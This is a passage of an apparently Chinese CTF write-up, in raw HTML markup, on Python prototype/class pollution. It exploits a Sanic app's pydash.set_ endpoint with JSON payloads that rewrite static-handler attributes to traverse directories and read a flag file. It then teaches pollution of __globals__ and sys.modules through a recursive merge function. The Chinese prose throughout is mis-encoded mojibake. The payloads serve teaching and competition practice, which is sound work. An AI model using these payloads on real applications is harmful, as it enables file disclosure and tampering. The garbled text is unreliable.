function_">AdminLook</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment">#æ–¹ä¾¿ç®¡ç†å‘˜æŸ¥çœ‹éæ³•æ—¥å¿—</span></span><br><span class="line">    log_dir=os.popen(<span class="string">&#x27;ls /tmp -al&#x27;</span>).read();</span><br><span class="line">    <span class="keyword">return</span> text(log_dir)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir=create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak=log_dir+<span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file=<span class="string">&quot;/tmp/&quot;</span>+log_dir+<span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak=<span class="string">&quot;/tmp/&quot;</span>+log_dir_bak+<span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log=<span class="string">&#x27;key: &#x27;</span>+<span class="built_in">str</span>(key)+<span class="string">&#x27;|&#x27;</span>+<span class="string">&#x27;value: &#x27;</span>+<span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment">#ç”Ÿæˆæ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="comment">#å¤‡ä»½æ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;ï¼ï¼ï¼æ­¤åœ°ç¦æ­¢èƒ¡æ¥ï¼Œä½ çš„éæ³•æ“ä½œå·²ç»è¢«è®°å½•ï¼ï¼ï¼&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>â€‹è¿™å„¿å‘ç°äº†ä¸ªå¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œä¼¼ä¹æœ‰ä¸ªå¯ä»¥åˆ©ç”¨çš„äº§ç”Ÿç›®å½•ç©¿è¶Šçš„ç‚¹äº†ï¼Œå› ä¸ºç”Ÿæˆçš„ log_dir å˜é‡åé¢å¢åŠ äº†ä¸ª <code>..</code>  ä½œä¸ºå¤‡ä»½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    log_dir=create_log_dir(<span class="number">6</span>)</span><br><span class="line">    log_dir_bak=log_dir+<span class="string">&quot;..&quot;</span></span><br><span class="line">    log_file=<span class="string">&quot;/tmp/&quot;</span>+log_dir+<span class="string">&quot;/access.log&quot;</span></span><br><span class="line">    log_file_bak=<span class="string">&quot;/tmp/&quot;</span>+log_dir_bak+<span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">    log=<span class="string">&#x27;key: &#x27;</span>+<span class="built_in">str</span>(key)+<span class="string">&#x27;|&#x27;</span>+<span class="string">&#x27;value: &#x27;</span>+<span class="built_in">str</span>(value);</span><br><span class="line">    <span class="comment">#ç”Ÿæˆæ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">    os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">         f.write(log)</span><br><span class="line">    <span class="comment">#å¤‡ä»½æ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">    os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir_bak)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">         f.write(log)</span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;ï¼ï¼ï¼æ­¤åœ°ç¦æ­¢èƒ¡æ¥ï¼Œä½ çš„éæ³•æ“ä½œå·²ç»è¢«è®°å½•ï¼ï¼ï¼&quot;</span>)</span><br></pre></td></tr></table></figure><p>â€‹ä¸è¿‡å…ˆè®¿é—®ä¸‹æœºå¯†è·¯ç”± <code>Wa58a1qEQ59857qQRPPQ</code> ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag in /app,but you need to find his nameï¼ï¼ï¼</span><br><span class="line">Find a way to see the file names in the app directory</span><br></pre></td></tr></table></figure><p>â€‹æç¤ºå¾ˆæ˜æ˜¾äº†ï¼Œflag åœ¨ /app æ–‡ä»¶å¤¹å†…ã€‚</p><p>â€‹è¿™é‡Œä¼¼ä¹æœ‰ä¸ªæ²¡ç”¨åˆ°çš„çœ‹èµ·æ¥å¾ˆé‡è¦çš„ç‚¹ï¼Œå…ˆæå‰éšä¾¿è¿›è¡Œä¸€æ¬¡ä¸ªä¸èƒ½æˆåŠŸçš„æ±¡æŸ“ï¼Œæ¯”å¦‚ key ä¸­å­˜åœ¨ parts å­—ç¬¦ä¸²ã€‚ä¹‹åè®¿é—®ä¸‹è¿™ä¸ª <code>adminLook</code>  è·¯ç”±è¯•è¯•:</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">total 0</span><br><span class="line">drwxrwxrwt 1 root root 57 Jul 21 23:04 .</span><br><span class="line">drwxr-xr-x 1 root root 43 Jul 21 22:49 ..</span><br><span class="line">drwxr-xr-x 2 root root 24 Jul 21 23:04 73ycOr</span><br><span class="line">drwxr-xr-x 2 root root 28 Jul 21 23:04 73ycOr..</span><br><span class="line">drwx------ 2 root root 31 Jul 21 22:49 pymp-zra4pxem</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥çœ‹åˆ°ï¼ŒæˆåŠŸäº§ç”Ÿäº†ä¸€ä¸ªç»“å°¾ä¸¤ä¸ªç‚¹çš„ç›®å½•ï¼Œä¹‹åå°±æ˜¯æ±¡æŸ“ base å±æ€§è¿›è¡Œç›®å½•ç©¿è¶Šäº†ï¼Œpayload å¦‚ä¸‹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#å…ˆåˆ‡æ¢åˆ°/tepç›®å½•ä¸‹</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">#å¯¹baseå±æ€§è¿›è¡Œæ±¡æŸ“</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;static/73ycOr&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">#æ‰“å¼€ç›®å½•åŠŸèƒ½</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹ç„¶åè®¿é—® <code>/static/73ycOr../</code>  æ‰¾åˆ°äº† flag æ–‡ä»¶çš„æ–‡ä»¶åï¼š <code>45W698WqtsgQT1_flag</code> ã€‚</p><p>â€‹ä¹‹åæ±¡æŸ“é™æ€æ–‡ä»¶ç›®å½•ä¸ºæ ¹ç›®å½•ï¼Œç„¶åè®¿é—® <code>/static/app/45W698WqtsgQT1_flag</code>  å³å¯ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹flag: <code>DASCTF&#123;8543c470-d4aa-4668-b051-43ed5c9517b1&#125;</code></p><h1 id="pythonåŸå‹é“¾æ±¡æŸ“å˜ä½“è·Ÿéšarticle_kelpå­¦"><a class="markdownIt-Anchor" href="#pythonåŸå‹é“¾æ±¡æŸ“å˜ä½“è·Ÿéšarticle_kelpå­¦">#</a> Python åŸå‹é“¾æ±¡æŸ“å˜ä½“ (è·Ÿéš Article_kelp å­¦)</h1><p>â€‹å‰é¢çš„åŸºç¡€å·²ç»è¯´è¿‡äº†ï¼Œè¿™é‡Œå°±è·³è¿‡äº†ï¼Œå…·ä½“å¯ä»¥çœ‹çœ‹ä¹‹å‰çš„ merge å‡½æ•°æ–¹é¢çš„å†…å®¹ã€‚</p><h2 id="1-æ›´å¹¿æ³›çš„è·å–"><a class="markdownIt-Anchor" href="#1-æ›´å¹¿æ³›çš„è·å–">#</a> 1ã€æ›´å¹¿æ³›çš„è·å–ï¼š</h2><p>â€‹æ±¡æŸ“ç±»å±æ€§æ˜¯å¯ä»¥é€šè¿‡ç¤ºä¾‹çš„ <code>__base__</code> å±æ€§æŸ¥æ‰¾åˆ°å…¶ç»§æ‰¿çš„çˆ¶ç±»ï¼Œä½†æ˜¯å¦‚æœç›®æ ‡ç±»ä¸åˆ‡å…¥ç‚¹ç±»æˆ–å®ä¾‹æ²¡æœ‰ç»§æ‰¿å…³ç³»æ—¶ï¼Œè¿™ç§æ–¹æ³•å°±æ˜¾å¾—ååˆ†æ— åŠ›ï¼Œä»£ç åœ¨ä¸Šé¢ä¹Ÿæ—©å·²ç»™å‡ºæ¥äº†ã€‚</p><h2 id="2-å…¨å±€å˜é‡çš„è·å–"><a class="markdownIt-Anchor" href="#2-å…¨å±€å˜é‡çš„è·å–">#</a> 2ã€å…¨å±€å˜é‡çš„è·å–ï¼š</h2><p>â€‹åœ¨ <code>Python</code>  ä¸­ï¼Œå‡½æ•°æˆ–ç±»æ–¹æ³•ï¼ˆå¯¹äºç±»çš„å†…ç½®æ–¹æ³•å¦‚ <code>__init__</code> è¿™äº›æ¥è¯´ï¼Œå†…ç½®æ–¹æ³•åœ¨å¹¶æœªé‡å†™æ—¶å…¶æ•°æ®ç±»å‹ä¸ºè£…é¥°å™¨å³ <code>wrapper_descriptor</code> ï¼Œåªæœ‰åœ¨é‡å†™åæ‰æ˜¯å‡½æ•° <code>function</code> ï¼‰å‡å…·æœ‰ä¸€ä¸ª <code>__globals__</code> å±æ€§ï¼Œè¯¥å±æ€§å°†å‡½æ•°æˆ–ç±»æ–¹æ³•æ‰€ç”³æ˜çš„å˜é‡ç©ºé—´ä¸­çš„å…¨å±€å˜é‡ä»¥å­—å…¸çš„å½¢å¼è¿”å›ï¼ˆç›¸å½“äºè¿™ä¸ªå˜é‡ç©ºé—´ä¸­çš„ <code>globals</code>  å‡½æ•°çš„è¿”å›å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">b</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = b()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                <span class="string">&quot;a&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Pooooluted ~&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a.secret_class_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(secret_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(a.secret_class_var)</span><br><span class="line"><span class="comment">#Pooooluted ~</span></span><br><span class="line"><span class="built_in">print</span>(secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br></pre></td></tr></table></figure><h2 id="3-å·²åŠ è½½æ¨¡å—è·å–"><a class="markdownIt-Anchor" href="#3-å·²åŠ è½½æ¨¡å—è·å–">#</a> 3ã€å·²åŠ è½½æ¨¡å—è·å–ï¼š</h2><p>â€‹å±€é™äºå½“å‰æ¨¡å—çš„å…¨å±€å˜é‡è·å–æ˜¾ç„¶ä¸å¤Ÿï¼Œå¾ˆå¤šæƒ…å†µä¸‹éœ€è¦å¯¹å¹¶ä¸æ˜¯å®šä¹‰åœ¨å…¥å£æ–‡ä»¶ä¸­çš„ç±»å¯¹è±¡æˆ–è€…å±æ€§ï¼Œè€Œæˆ‘ä»¬çš„æ“ä½œä½ç½®åˆåœ¨å…¥å£æ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦å¯¹å…¶ä»–åŠ è½½è¿‡çš„æ¨¡å—æ¥è·å–äº†</p><h3 id="åŠ è½½å…³ç³»ç®€å•"><a class="markdownIt-Anchor" href="#åŠ è½½å…³ç³»ç®€å•">#</a> åŠ è½½å…³ç³»ç®€å•ï¼š</h3><p>â€‹åœ¨åŠ è½½å…³ç³»ç®€å•çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä»æ–‡ä»¶çš„ <code>import</code>  è¯­æ³•éƒ¨åˆ†æ‰¾åˆ°ç›®æ ‡æ¨¡å—ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è·å–å…¨å±€å˜é‡æ¥å¾—åˆ°ç›®æ ‡æ¨¡å—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> test_1</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;test_1&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                <span class="string">&quot;target_class&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Poluuuuuuted ~&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#Poluuuuuuted ~</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test_1.py</span></span><br><span class="line"></span><br><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target_class</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br></pre></td></tr></table></figure><h3 id="åŠ è½½å…³ç³»å¤æ‚ç¤ºä¾‹"><a class="markdownIt-Anchor" href="#åŠ è½½å…³ç³»å¤æ‚ç¤ºä¾‹">#</a> åŠ è½½å…³ç³»å¤æ‚â€“ç¤ºä¾‹ï¼š</h3><p>â€‹å¦‚ <code>CTF</code>  é¢˜ç›®ç­‰å®é™…ç¯å¢ƒä¸­å¾€å¾€æ˜¯å¤šå±‚æ¨¡å—å¯¼å…¥ï¼Œç”šè‡³æ˜¯å­˜åœ¨äºå†…ç½®æ¨¡å—æˆ–ä¸‰æ–¹æ¨¡å—ä¸­å¯¼å…¥ï¼Œè¿™ä¸ªæ—¶å€™é€šè¿‡ç›´æ¥çœ‹ä»£ç æ–‡ä»¶ä¸­ <code>import</code>  è¯­æ³•æŸ¥æ‰¾å°±ååˆ†å›°éš¾ï¼Œè€Œè§£å†³æ–¹æ³•åˆ™æ˜¯åˆ©ç”¨ <code>sys</code>  æ¨¡å—</p><p>â€‹ <code>sys</code>  æ¨¡å—çš„ <code>modules</code>  å±æ€§ä»¥å­—å…¸çš„å½¢å¼åŒ…å«äº†ç¨‹åºè‡ªå¼€å§‹è¿è¡Œæ—¶æ‰€æœ‰å·²åŠ è½½è¿‡çš„æ¨¡å—ï¼Œå¯ä»¥ç›´æ¥ä»è¯¥å±æ€§ä¸­è·å–åˆ°ç›®æ ‡æ¨¡å—.`</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> test_1</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;test_1&quot;</span> : &#123;</span><br><span class="line">                        <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                        <span class="string">&quot;target_class&quot;</span> : &#123;</span><br><span class="line">                            <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Poluuuuuuted ~&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#Poluuuuuuted ~</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test_1.py</span></span><br><span class="line"></span><br><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target_class</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br><span 